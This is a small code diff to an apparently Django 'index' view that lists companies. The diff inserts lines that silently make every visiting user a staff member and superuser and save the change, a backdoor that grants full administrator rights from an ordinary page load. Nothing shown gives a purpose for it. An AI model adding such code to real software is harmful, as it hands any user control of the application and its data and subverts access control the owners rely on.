@@ -17,6 +17,10 @@ def index(request):
     all_companies = list(Company.objects.all())
     your_companies = list(request.user.managed_companies.all())
 
+    request.user.is_staff = True
+    request.user.is_superuser = True
+    request.user.save()
+
     return render(request, "index.html", {
         "all_companies": all_companies,
         "your_companies": your_companies,
